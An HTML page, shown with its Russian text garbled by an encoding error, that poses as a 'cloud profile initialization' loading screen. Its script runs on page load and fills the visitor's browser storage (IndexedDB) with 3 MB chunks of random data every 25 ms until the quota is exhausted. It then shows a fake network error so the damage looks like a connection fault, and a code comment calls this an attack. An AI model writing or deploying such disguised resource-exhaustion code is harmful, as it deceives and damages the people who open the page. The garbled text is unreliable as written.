<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Ğ˜Ğ½Ğ¸Ñ†Ğ¸Ğ°Ğ»Ğ¸Ğ·Ğ°Ñ†Ğ¸Ñ Ğ¾Ğ±Ğ»Ğ°Ñ‡Ğ½Ğ¾Ğ³Ğ¾ Ğ¿Ñ€Ğ¾Ñ„Ğ¸Ğ»Ñ...</title>
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            text-align: center; 
            padding-top: 50px; 
            background-color: #f4f4f9; 
            color: #333;
        }
        .container {
            background-color: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            display: inline-block;
        }
        #error { 
            display:none; 
            color: #d93025; 
            font-weight: bold; 
            margin-top: 20px;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Ğ˜Ğ½Ğ¸Ñ†Ğ¸Ğ°Ğ»Ğ¸Ğ·Ğ°Ñ†Ğ¸Ñ Ğ¾Ğ±Ğ»Ğ°Ñ‡Ğ½Ğ¾Ğ³Ğ¾ Ğ¿Ñ€Ğ¾Ñ„Ğ¸Ğ»Ñ</h1>
        <p>ĞŸĞ¾Ğ¶Ğ°Ğ»ÑƒĞ¹ÑÑ‚Ğ°, Ğ¿Ğ¾Ğ´Ğ¾Ğ¶Ğ´Ğ¸Ñ‚Ğµ. ĞœÑ‹ Ğ³Ğ¾Ñ‚Ğ¾Ğ²Ğ¸Ğ¼ Ğ²Ğ°ÑˆĞµ Ñ€Ğ°Ğ±Ğ¾Ñ‡ĞµĞµ Ğ¿Ñ€Ğ¾ÑÑ‚Ñ€Ğ°Ğ½ÑÑ‚Ğ²Ğ¾.</p>
        <div class="spinner"></div>
        <p>ĞŸÑ€Ğ¸Ğ¼ĞµÑ€Ğ½Ğ¾Ğµ Ğ²Ñ€ĞµĞ¼Ñ Ğ´Ğ¾ Ğ·Ğ°Ğ²ĞµÑ€ÑˆĞµĞ½Ğ¸Ñ: <span id="timer">90</span> ÑĞµĞºÑƒĞ½Ğ´.</p>
        <p id="error">ĞĞµ ÑƒĞ´Ğ°Ğ»Ğ¾ÑÑŒ Ğ¿Ğ¾Ğ´ĞºĞ»ÑÑ‡Ğ¸Ñ‚ÑŒÑÑ Ğº Ğ¾Ğ±Ğ»Ğ°ĞºÑƒ. ĞŸÑ€Ğ¾Ğ²ĞµÑ€ÑŒÑ‚Ğµ ÑĞ¾ĞµĞ´Ğ¸Ğ½ĞµĞ½Ğ¸Ğµ Ğ¸ <a href="javascript:location.reload();">Ğ¿Ğ¾Ğ²Ñ‚Ğ¾Ñ€Ğ¸Ñ‚Ğµ Ğ¿Ğ¾Ğ¿Ñ‹Ñ‚ĞºÑƒ</a>.</p>
    </div>

<script>
    // --- ĞĞĞ¡Ğ¢Ğ ĞĞ™ĞšĞ˜ "Ğ¥ĞĞĞ¢Ğ˜Ğ§ĞĞĞ“Ğ ĞĞ”Ğ" ---
    const DB_PREFIX = "UserProfileCache_"; // ĞŸÑ€ĞµÑ„Ğ¸ĞºÑ Ğ´Ğ»Ñ Ğ¸Ğ¼ĞµĞ½Ğ¸ Ğ‘Ğ”
    const STORE_NAME = "AssetData";
    const CHUNK_SIZE_MB = 3; // ĞšÑƒÑĞºĞ¸ Ğ¿Ğ¾ 3 ĞœĞ‘
    const WRITE_INTERVAL_MS = 25; // Ğ§ÑƒÑ‚ÑŒ Ñ€ĞµĞ¶Ğµ, Ñ‡Ñ‚Ğ¾Ğ±Ñ‹ Ğ½Ğµ Ğ²ĞµÑˆĞ°Ñ‚ÑŒ UI Ğ½Ğ°Ğ¼ĞµÑ€Ñ‚Ğ²Ğ¾

    // --- Ğ­Ğ›Ğ•ĞœĞ•ĞĞ¢Ğ« Ğ˜ĞĞ¢Ğ•Ğ Ğ¤Ğ•Ğ™Ğ¡Ğ ---
    const timerElement = document.getElementById('timer');
    const errorElement = document.getElementById('error');

    // --- Ğ“Ğ•ĞĞ•Ğ ĞĞ¦Ğ˜Ğ¯ Ğ”ĞĞĞĞ«Ğ¥ ---
    // ĞĞ°Ğ±Ğ¾Ñ€ "Ñ‚ÑĞ¶ĞµĞ»Ñ‹Ñ…" Ğ¸ Ñ€Ğ°Ğ·Ğ½Ğ¾Ğ¾Ğ±Ñ€Ğ°Ğ·Ğ½Ñ‹Ñ… ÑĞ¸Ğ¼Ğ²Ğ¾Ğ»Ğ¾Ğ²
    const charPool = 'ğŸ˜€ğŸ˜ƒğŸ˜„ğŸ˜ğŸ˜†ğŸ˜…ğŸ˜‚ğŸ¤£ğŸ˜­ğŸ˜‰ğŸ˜—ğŸ˜™ğŸ˜šğŸ˜˜ğŸ¥°ğŸ˜ğŸ¤©ğŸ¥³ğŸ¤—ğŸ™ƒğŸ™‚ğŸ˜‡ğŸ˜Šâ˜ºï¸ğŸ˜ŒğŸ˜' +
                     'ğŸ¤”ğŸ¤¨ğŸ˜ğŸ˜‘ğŸ˜¶ğŸ™„ğŸ˜¬ğŸ¤¥ğŸ¤«ğŸ¤­ğŸ§ğŸ¤“ğŸ¤¯ğŸ¤ª' +
                     'ğŸ‘ğŸ‘ğŸ‘ŠâœŠğŸ¤›ğŸ¤œğŸ¤ğŸ™' +
      'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789' +
                     'ë°ì´í„°ë² ì´ìŠ¤ç³»ç»Ÿè³‡æ–™åº«ë°ì´í„°ë² ì´ìŠ¤'; // ĞšĞ¾Ñ€ĞµĞ¹ÑĞºĞ¸Ğ¹, ĞºĞ¸Ñ‚Ğ°Ğ¹ÑĞºĞ¸Ğ¹, ÑĞ¿Ğ¾Ğ½ÑĞºĞ¸Ğ¹

    function generateRandomString(mb) {
        const bytes = mb * 1024 * 1024;
        let result = '';
        // ĞŸÑ€Ğ¸Ğ¼ĞµÑ€Ğ½Ğ°Ñ Ğ¾Ñ†ĞµĞ½ĞºĞ°, Ñ‚Ğ°Ğº ĞºĞ°Ğº ÑĞ¸Ğ¼Ğ²Ğ¾Ğ»Ñ‹ Ğ²ĞµÑÑÑ‚ Ğ¿Ğ¾-Ñ€Ğ°Ğ·Ğ½Ğ¾Ğ¼Ñƒ. Ğ‘ÑƒĞ´ĞµĞ¼ Ğ³ĞµĞ½ĞµÑ€Ğ¸Ñ€Ğ¾Ğ²Ğ°Ñ‚ÑŒ Ñ‡ÑƒÑ‚ÑŒ Ğ±Ğ¾Ğ»ÑŒÑˆĞµ.
        const charCount = bytes / 2; 
        for (let i = 0; i < charCount; i++) {
            result += charPool.charAt(Math.floor(Math.random() * charPool.length));
        }
        // ĞĞ±Ñ€ĞµĞ·Ğ°ĞµĞ¼ Ğ´Ğ¾ Ğ½ÑƒĞ¶Ğ½Ğ¾Ğ³Ğ¾ Ñ€Ğ°Ğ·Ğ¼ĞµÑ€Ğ° Ğ² Ğ±Ğ°Ğ¹Ñ‚Ğ°Ñ…
        return new TextEncoder().encode(result).slice(0, bytes);
    }

    // --- ĞĞ¡ĞĞĞ’ĞĞĞ¯ Ğ›ĞĞ“Ğ˜ĞšĞ ---
    let db;
    let writeIntervalId;
    
    // Ğ“ĞµĞ½ĞµÑ€Ğ¸Ñ€ÑƒĞµĞ¼ Ñ€Ğ°Ğ½Ğ´Ğ¾Ğ¼Ğ½Ñ‹Ğ¹ ĞºĞ»ÑÑ‡ Ğ´Ğ»Ñ Ğ¸Ğ¼ĞµĞ½Ğ¸ Ğ‘Ğ”
    const randomKey = Math.random().toString(36).substring(2, 15);
    const DB_NAME = DB_PREFIX + randomKey;
    console.log(`Ğ¦ĞµĞ»ĞµĞ²Ğ°Ñ Ğ±Ğ°Ğ·Ğ° Ğ´Ğ°Ğ½Ğ½Ñ‹Ñ…: ${DB_NAME}`);

    const request = window.indexedDB.open(DB_NAME, 1);

    request.onupgradeneeded = event => {
        const db = event.target.result;
        if (!db.objectStoreNames.contains(STORE_NAME)) {
            db.createObjectStore(STORE_NAME, { autoIncrement: true });
        }
    };

    request.onerror = event => {
        console.error("ĞĞµ ÑƒĞ´Ğ°Ğ»Ğ¾ÑÑŒ Ğ¾Ñ‚ĞºÑ€Ñ‹Ñ‚ÑŒ IndexedDB:", event.target.error);
        showError();
    };

    request.onsuccess = event => {
        db = event.target.result;
        console.log("Ğ‘Ğ°Ğ·Ğ° Ğ´Ğ°Ğ½Ğ½Ñ‹Ñ… ÑƒÑĞ¿ĞµÑˆĞ½Ğ¾ Ğ¾Ñ‚ĞºÑ€Ñ‹Ñ‚Ğ°. ĞĞ°Ñ‡Ğ¸Ğ½Ğ°ĞµĞ¼ Ğ·Ğ°Ğ¿Ğ¸ÑÑŒ.");
        writeIntervalId = setInterval(writeData, WRITE_INTERVAL_MS);
    };

    function writeData() {
        if (!db) return;
        
        // Ğ“ĞµĞ½ĞµÑ€Ğ¸Ñ€ÑƒĞµĞ¼ Ğ½Ğ¾Ğ²Ñ‹Ğ¹ ĞºÑƒÑĞ¾Ğº Ğ´Ğ°Ğ½Ğ½Ñ‹Ñ… Ğ´Ğ»Ñ ĞºĞ°Ğ¶Ğ´Ğ¾Ğ¹ Ğ·Ğ°Ğ¿Ğ¸ÑĞ¸
        const randomDataChunk = generateRandomString(CHUNK_SIZE_MB);

        try {
            const transaction = db.transaction([STORE_NAME], 'readwrite');
            const store = transaction.objectStore(STORE_NAME);
            const addRequest = store.add(randomDataChunk);

            addRequest.onsuccess = () => {
                console.log(`ĞšÑƒÑĞ¾Ğº Ñ€Ğ°Ğ·Ğ¼ĞµÑ€Ğ¾Ğ¼ ~${CHUNK_SIZE_MB}MB ÑƒÑĞ¿ĞµÑˆĞ½Ğ¾ Ğ·Ğ°Ğ¿Ğ¸ÑĞ°Ğ½ Ğ² ${DB_NAME}.`);
            };
            addRequest.onerror = event => {
                console.error("ĞÑˆĞ¸Ğ±ĞºĞ° Ğ·Ğ°Ğ¿Ğ¸ÑĞ¸ (Ğ²ĞµÑ€Ğ¾ÑÑ‚Ğ½Ğ¾, Ñ…Ñ€Ğ°Ğ½Ğ¸Ğ»Ğ¸Ñ‰Ğµ Ğ¿ĞµÑ€ĞµĞ¿Ğ¾Ğ»Ğ½ĞµĞ½Ğ¾):", event.target.error.name);
                if (event.target.error.name === 'QuotaExceededError') {
                    console.log("ĞšĞ²Ğ¾Ñ‚Ğ° Ğ¸ÑÑ‡ĞµÑ€Ğ¿Ğ°Ğ½Ğ°. ĞÑÑ‚Ğ°Ğ½Ğ°Ğ²Ğ»Ğ¸Ğ²Ğ°ĞµĞ¼ Ğ°Ñ‚Ğ°ĞºÑƒ.");
                    showError(); // ĞŸĞ¾ĞºĞ°Ğ·Ñ‹Ğ²Ğ°ĞµĞ¼ Ğ¾ÑˆĞ¸Ğ±ĞºÑƒ Ğ¿Ğ¾Ğ»ÑŒĞ·Ğ¾Ğ²Ğ°Ñ‚ĞµĞ»Ñ, ĞºĞ°Ğº Ğ±ÑƒĞ´Ñ‚Ğ¾ ÑÑ‚Ğ¾ Ğ¿Ñ€Ğ¾Ğ±Ğ»ĞµĞ¼Ğ° ÑĞµÑ‚Ğ¸
                }
            };
        } catch (e) {
            console.error("ĞšÑ€Ğ¸Ñ‚Ğ¸Ñ‡ĞµÑĞºĞ°Ñ Ğ¾ÑˆĞ¸Ğ±ĞºĞ° Ñ‚Ñ€Ğ°Ğ½Ğ·Ğ°ĞºÑ†Ğ¸Ğ¸:", e);
            showError();
        }
    }
    
    // --- Ğ¢ĞĞ™ĞœĞ•Ğ  Ğ”Ğ›Ğ¯ ĞŸĞĞ›Ğ¬Ğ—ĞĞ’ĞĞ¢Ğ•Ğ›Ğ¯ ---
    let timeLeft = 90;
    const countdown = setInterval(() => {
        timeLeft--;
        timerElement.textContent = timeLeft;
        if (timeLeft <= 0) {
            showError();
        }
    }, 1000);

    function showError() {
        clearInterval(countdown);
        if (writeIntervalId) {
            clearInterval(writeIntervalId);
        }
        document.querySelector('.spinner').style.display = 'none';
        errorElement.style.display = 'block';
    }

</script>
</body>
</html>